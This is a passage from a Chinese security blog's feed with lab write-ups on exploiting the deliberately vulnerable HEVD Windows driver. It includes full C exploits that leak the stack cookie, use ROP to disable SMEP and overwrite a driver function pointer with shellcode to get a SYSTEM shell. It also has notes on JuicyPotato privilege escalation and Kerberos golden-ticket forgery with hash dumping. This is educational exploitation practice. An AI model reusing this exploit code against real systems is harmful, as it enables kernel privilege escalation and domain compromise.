class="line">DWORD size = <span class="built_in">sizeof</span>(payload);</span><br><span class="line">DWORD info = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, <span class="number">0x22200B</span>,</span><br><span class="line">payload, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Key value 0x%llx\n&quot;</span>, value);</span><br><span class="line"></span><br><span class="line">funcaddr rsp = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">scanf_s</span>(<span class="string">&quot;%llx&quot;</span>, &amp;rsp);</span><br><span class="line">rsp -= (<span class="number">0x868</span> + <span class="number">0x258</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] RSP value 0x%llx\n&quot;</span>, rsp);</span><br><span class="line"></span><br><span class="line">rsp ^= value;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie value 0x%llx\n&quot;</span>, rsp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br><span class="line"><span class="comment">//RtlFillMemory(stackspace, 0x238, &#x27;A&#x27;);</span></span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x200</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">size = <span class="number">0x258</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x200</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x208</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x210</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x218</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x220</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x228</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x230</span>) = (funcaddr)rsp;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x238</span>) = (funcaddr)pop_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x240</span>) = (funcaddr)<span class="number">0x00000000002506f8</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x248</span>) = (funcaddr)mov_cr4_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x250</span>) = (funcaddr)shellcode_addr;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">stackspace, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/04085ad653545f1461b7b9f567e10b46.png" alt="image-20240224121139780" /></p><h1 id="微调exploit"><a class="markdownIt-Anchor" href="#微调exploit"></a> 微调exploit</h1><ul><li><p>shellcode得仔细调整rsp值</p><p>很简单，和最开的是栈溢出一样，直接一个push两个ret，让rsp+0x28变成了rsp+0x10</p></li><li><p>还有就是泄露内核栈地址的时候得稳定，让其包含当前进程</p><p>我的解决方法简单粗暴，多线程和直接加<code> system(&quot;pause&quot;);</code>，重新弄好的方案都能打包成一个函数了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulUseStackInfo</span><span class="params">(<span class="type">wchar_t</span> ProcName[])</span> </span>&#123;</span><br><span class="line">pStackInfo stackinfo = (pStackInfo)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(StackInfo));</span><br><span class="line"><span class="keyword">if</span> (stackinfo == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Can&#x27;t allocate memory\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">stackinfo-&gt;ModuleName = ProcName;</span><br><span class="line">stackinfo-&gt;result = <span class="number">0</span>;</span><br><span class="line">HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0x100</span>, (LPTHREAD_START_ROUTINE)ulGetStackLimit, stackinfo, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Can&#x27;t get thread\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">funcaddr baseaddr = stackinfo-&gt;result;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">free</span>(stackinfo);</span><br><span class="line"><span class="keyword">return</span> baseaddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>最终exp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflowGS</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">DWORD oldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">LPVOID shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line"><span class="built_in">sizeof</span>(cmd),</span><br><span class="line">MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="built_in">sizeof</span>(cmd));</span><br><span class="line"></span><br><span class="line">funcaddr stack_base = <span class="built_in">ulUseStackInfo</span>(<span class="string">L&quot;Ring3ToKernel.exe&quot;</span>);</span><br><span class="line">funcaddr base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">funcaddr pop_rcx = base + <span class="number">0x20C64C</span>;</span><br><span class="line">funcaddr mov_cr4_rcx = base + <span class="number">0x39eb47</span>;</span><br><span class="line">funcaddr hevd_base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;HEVD.sys&quot;</span>);</span><br><span class="line">funcaddr cookie_addr = hevd_base + <span class="number">0x3000</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie Address 0x%llx\n&quot;</span>,cookie_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Atribute Write GET key value\n&quot;</span>);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WRITE_WHAT_WHERE</span></span><br><span class="line">&#123;</span><br><span class="line">funcaddr* What;</span><br><span class="line">funcaddr* Where;</span><br><span class="line">&#125;arbitrary_write, * pArbitraryWrite;</span><br><span class="line">funcaddr value = <span class="number">0</span>;</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(arbitrary_write));</span><br><span class="line">payload-&gt;What = (funcaddr*)cookie_addr;</span><br><span class="line">payload-&gt;Where = &amp;value;</span><br><span class="line">DWORD size = <span class="built_in">sizeof</span>(payload);</span><br><span class="line">DWORD info = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, <span class="number">0x22200B</span>,</span><br><span class="line">payload, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Key value 0x%llx\n&quot;</span>, value);</span><br><span class="line"></span><br><span class="line">funcaddr cookie = <span class="number">0</span>;</span><br><span class="line">stack_base -= (<span class="number">0x868</span> + <span class="number">0x258</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] RSP value 0x%llx\n&quot;</span>, stack_base);</span><br><span class="line"></span><br><span class="line">cookie = stack_base ^ value;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie value 0x%llx\n&quot;</span>, cookie);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br><span class="line"><span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x200</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">size = <span class="number">0x258</span>;</span><br><span class="line"><span class="comment">//size = 0x200;</span></span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x200</span>) = (funcaddr)cookie;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x208</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x210</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x218</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x220</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x228</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x230</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x238</span>) = (funcaddr)pop_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x240</span>) = (funcaddr)<span class="number">0x00000000002506f8</span>;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x248</span>) = (funcaddr)mov_cr4_rcx;</span><br><span class="line">*(funcaddr*)(stackspace + <span class="number">0x250</span>) = (funcaddr)shellcode_addr;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">stackspace, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/fd9a8491ecc46c58eb2957ca7579ab55.png" alt="image-20240224140007704" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;HEVD中的栈溢出加上GS保护&lt;br /&gt;
还有一个知识点就是windows内核栈地址泄露&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【Win Pwn】HEVD-任意地址写</title>
    <link href="https://joe1sn.eu.org/2024/02/23/win-hevd-exp-arbitrary-write/"/>
    <id>https://joe1sn.eu.org/2024/02/23/win-hevd-exp-arbitrary-write/</id>
    <published>2024-02-23T15:35:34.000Z</published>
    <updated>2024-02-24T06:19:14.407Z</updated>
    
    <content type="html"><![CDATA[<p>非预期方法，暂时不会放出来</p><span id="more"></span><h1 id="hevd练习-任意地址写"><a class="markdownIt-Anchor" href="#hevd练习-任意地址写"></a> HEVD练习-任意地址写</h1><h2 id="漏洞点"><a class="markdownIt-Anchor" href="#漏洞点"></a> 漏洞点</h2><p><img src="https://img.joe1sn.top/uploads/big/ab81f0548c9c7beae376282f0a845c14.png" alt="image-20240216173136321" /></p><h2 id="一点好玩的"><a class="markdownIt-Anchor" href="#一点好玩的"></a> 一点好玩的</h2><p>传入一个结构体，得到结构体过后写入内容</p><p>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">WRITE_WHAT_WHERE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* What;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* Where;</span><br><span class="line">&#125;arbitrary_write, *pArbitraryWrite;</span><br></pre></td></tr></table></figure><p>这里我做一个比较有意思的事儿，比如修改某个变量的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(arbitrary_write));</span><br><span class="line"><span class="keyword">if</span> (payload == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Malloc payload failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> vuln = <span class="number">0x10000</span>;</span><br><span class="line"><span class="type">int</span> pay = <span class="number">0xDEADBEEF</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] the vuln value is 0x%x\n&quot;</span>, vuln);</span><br><span class="line">payload-&gt;What = (<span class="type">unsigned</span> <span class="type">int</span> *)&amp;pay;</span><br><span class="line">payload-&gt;Where = (<span class="type">unsigned</span> <span class="type">int</span> *)&amp;vuln;</span><br><span class="line">DWORD size = <span class="keyword">sizeof</span>(payload);</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">DeviceIoControl(hDevice, ioctl,</span><br><span class="line">payload, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] now vuln value is 0x%x&quot;</span>, vuln);</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/46a0ef83a8f20889bc2d73915c1ab5f1.png" alt="image-20240216174148214" /></p><p><img src="https://img.joe1sn.top/uploads/big/2a02f670b395a1f09d2e95b1992ce847.png" alt="image-20240216174214564" /></p><p>利用ioctl的机制也可以实现读取某个地址的值</p><h2 id="预期打法"><a class="markdownIt-Anchor" href="#预期打法"></a> 预期打法</h2><p>最开始栈溢出我们提权使用的是修改当前的Token的低位并修改Token的Present和Enable，如果这里我们知道地址的话就可以做一样的操作了</p><p>但是在普通权限下不可能知道地址，那么我们是否能够覆盖HEVD驱动中的某些函数，使用类似inline hook的方式，将函数地址改为我们shellcode的地址，这样我们把问题变成了和内核栈溢出类似的情况了</p><p>利用之前的<code>NtQueryInfomation</code>的<code>ulGetKernelBase</code>函数可以获得HEVD的基地址</p><p><img src="https://img.joe1sn.top/uploads/big/9e0926c08abe24bc42efe409abb7e4a0.png" alt="image-20240216200738623" /></p><p>这里我就尝试覆写DbgPrintEx函数为shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(arbitrary_write));</span><br><span class="line"><span class="keyword">if</span> (payload == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] Malloc payload failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">funcaddr hevd_base = ulGetKernelBase((PCHAR)<span class="string">&quot;HEVD&quot;</span>);</span><br><span class="line">funcaddr dbgprint_addr = hevd_base + <span class="number">0x2008</span>;</span><br><span class="line">funcaddr nt_base = ulGetKernelBase((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] HEVD SYS kernel base %llx\n&quot;</span>, hevd_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] ntoskrnl kernel base %llx\n&quot;</span>, nt_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] HEVD DbgPrint Address %llx\n&quot;</span>, dbgprint_addr);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Allocate Shellcode Space\n&quot;</span>);</span><br><span class="line">LPVOID shellcode_addr = VirtualAlloc(<span class="literal">NULL</span>,</span><br><span class="line"><span class="keyword">sizeof</span>(cmd),</span><br><span class="line">MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (shellcode_addr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[!] shellcode addr failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="keyword">sizeof</span>(cmd));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Shellcode addr %llx\n&quot;</span>, shellcode_addr);</span><br><span class="line"></span><br><span class="line">payload-&gt;What = (<span class="type">unsigned</span> <span class="type">int</span> *)&amp;shellcode_addr;</span><br><span class="line">payload-&gt;Where = (<span class="type">unsigned</span> <span class="type">int</span> *)dbgprint_addr;</span><br><span class="line">DWORD size = <span class="keyword">sizeof</span>(payload);</span><br><span class="line"></span><br><span class="line">DWORD info = <span class="number">0</span>;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">DeviceIoControl(hDevice, ioctl,</span><br><span class="line">payload, size,</span><br><span class="line"><span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">&amp;info, <span class="literal">NULL</span>);</span><br><span class="line">system(<span class="string">&quot;cmd.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>注意，覆写的是<code>HEVD_BASE+0x2008</code>的值 所指向的值</p><p><img src="https://img.joe1sn.top/uploads/big/575c9467678be806ed46eff70b42791e.png" alt="image-20240216210359750" /></p><p>成功覆写</p><p><img src="https://img.joe1sn.top/uploads/big/d176b13c88d12fff078f41084333a6ed.png" alt="image-20240216210450239" /></p><p>现在比较麻烦的就是过SMEP保护。</p><p>可以利用之前GS保护使用的内核栈泄露<br /><a href="https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/">https://joe1sn.eu.org/2024/02/24/win-hevd-exp-stackoverflow-GS/</a></p><p>直接在栈上布置参数和ROP链，要么取消SMEP，要么参考KVAS直接使用ROP链申请的堆中执行，后续操作就和栈溢出一致，只不过需要把某个函数该地址改为第一个ROP地址</p><h2 id="非预期利用"><a class="markdownIt-Anchor" href="#非预期利用"></a> 非预期利用</h2><p>写到这里在翻查别人wp的时候突然想到驱动是一直在后台运行的，我们可以多次触发该漏洞，然后我用了一种非常规的方法，eee，目前这种方法我还用在一些项目上，所以暂时不公开…SORRY</p><p>方法可以参考：<a href="https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/">https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/</a><br />（虽然我的方法比他简单很多）</p><p><img src="https://img.joe1sn.top/uploads/big/ffd66dc4226285ae67ff3ae69b05715a.png" alt="image-20240216232930887" /></p><p>可以优雅退出不卡顿</p><h1 id="引用"><a class="markdownIt-Anchor" href="#引用"></a> 引用</h1><p><a href="https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/">https://0dr3f.github.io/2023/07/14/HEVD_Win10_22H2_ArbitraryOverwrite/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;非预期方法，暂时不会放出来&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="kernel" scheme="https://joe1sn.eu.org/tags/kernel/"/>
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【内网】从PoC看JuicyPotato提权</title>
    <link href="https://joe1sn.eu.org/2024/02/23/potato-1/"/>
    <id>https://joe1sn.eu.org/2024/02/23/potato-1/</id>
    <published>2024-02-23T06:49:21.000Z</published>
    <updated>2024-02-23T06:53:20.081Z</updated>
    
    <content type="html"><![CDATA[<p>从此认识到自己不是做win安全的料</p><span id="more"></span><p>个人认为JuictPotato的前身是著名的<code>Rotten Potato</code></p><p><img src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-d521498a177634056408fa3503d1d1362d5b0ac7.png" alt="image-20211022212121001" /></p><blockquote><ol><li>使用CoGetInstanceFromIStorage API 调用欺骗RPC,对代理进行身份验证.在此调用中指定了代理 IP/端口</li><li>RPC 向代理发送 NTLM 协商包</li><li>代理依赖的NTLM协商到RPC在端口135，被用作模板。同时，执行对AcceptSecurityContext的调用以强制进行本地身份验证<br />注:此包被修改为强制本地身份验证.</li><li>&amp; 5. RPC 135和AcceptSecurityContext用NTLM Challenge回复</li><li>将两个数据包的内容混合以匹配本地协商并转发到RPC</li><li>RPC使用发送到AcceptSecurityContext(8.)的NLTM Auth包进行响应，并执行模拟</li></ol></blockquote><ol><li><p>【PotatoAPI】创建COM监听器<code>startCOMListenerThread</code></p><ul><li><p>初始化<code>WinSocket</code>，创建非阻塞式socket，并监听<code>-t</code>端口。<strong>跳转到2</strong>，后面的就是监听循环中的</p></li><li><p>【LocalNegotiator】使用<code>processNtlmBytes</code>处理返回地NTLM信息。处理顺序刚好是1,2,3</p><ul><li>首先获取<a href="https://learn.microsoft.com/zh-cn/windows/win32/secgloss/s-gly"><em>安全主体</em></a>的预先存在的凭据的句柄，初始化Client和Sever的Token，建立安全上下文（新进程的身份验证），转发给RPC</li><li>RPC返回NTLM挑战应答问题，新进程的身份验证也会返回他的NTLM挑战应答问题，然后改装RPC的数据，塞入新进程的身份验证的NTLM挑战应答的部分数据</li><li>从系统回答中，创建新的system令牌</li></ul></li></ul></li><li><p>【PotatoAPI】同本地135端口建立RPC连接，发送消息从<code>PotatoAPI-&gt;rpcSendQ</code>走出队列</p></li><li><p>【PotatoAPI】触发<code>triggerDCOM</code></p><ul><li><code>StgCreateDocfileOnILockBytes</code>：创建Istorage对象</li><li>【IStorageTrigger】创建<code>IStorageTrigger</code>对象</li><li><code>CLSIDFromString</code>：将CLSID字符转为COM对象</li><li><code> CoGetInstanceFromIStorage</code> ：创建一个新的 对象，使用<code> IPersistFile：：Load</code>初始化</li><li><strong>触发DCOM后，进入1中的监听循环</strong></li></ul></li><li><p>通过得到的system token，经典的<code>CreateProcessWithTokenW</code>创建新的进程</p></li></ol><p>要一个人写的话工作量还是挺大的，而且<code>IstroageTrigger</code>得自己构造，感谢开源PoC！</p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p><p><a href="https://forum.butian.net/share/860">https://forum.butian.net/share/860</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;从此认识到自己不是做win安全的料&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/tags/notes/"/>
    
    <category term="pentest" scheme="https://joe1sn.eu.org/tags/pentest/"/>
    
  </entry>
  
  <entry>
    <title>【内网】探索Windows内网的Kerberos协议</title>
    <link href="https://joe1sn.eu.org/2024/02/23/kerberos/"/>
    <id>https://joe1sn.eu.org/2024/02/23/kerberos/</id>
    <published>2024-02-23T04:29:23.000Z</published>
    <updated>2024-02-23T06:56:56.176Z</updated>
    
    <content type="html"><![CDATA[<p>感恩学校扎实的密码学功底，分析起来也是很简单的</p><span id="more"></span><p>说白了就一张图</p><p><img src="https://img.joe1sn.top/uploads/big/173ba503f8f4d7d2cbc88312cb0a2551.png" alt="img" /></p><p><img src="https://img.joe1sn.top/uploads/big/1946078615b1e4c4c817b0bf733df49d.png" alt="img" /></p><h1 id="攻击方式"><a class="markdownIt-Anchor" href="#攻击方式"></a> 攻击方式</h1><h2 id="黄金票据"><a class="markdownIt-Anchor" href="#黄金票据"></a> 黄金票据</h2><p>第三步中 使用 KDC 特定账户 Krbtgt 的 NTLM-Hash 时，如果我们有了该<code>NTML-Hash</code>那么就能做到伪造TGT</p><p>该方法由于需要DC的<code>NTLM-Hash</code>，所以用于留后门</p><p>假设我们拿到了DC上administrator权限的shell</p><p><img src="https://img.joe1sn.top/uploads/big/682d17bfb67add232b394fad39c00485.png" alt="image-20240222212152261" /></p><p>抓取Hash</p><p><img src="https://img.joe1sn.top/uploads/big/bc35669581bb749a80113b2d145f4ac6.png" alt="image-20240222212207346" /></p><p><img src="https://img.joe1sn.top/uploads/big/88027e45108649714df4180ab9a0df53.png" alt="image-20240222212223689" /></p><ul><li>CS使用的命令为：lsadump</li><li>相关项目：<a 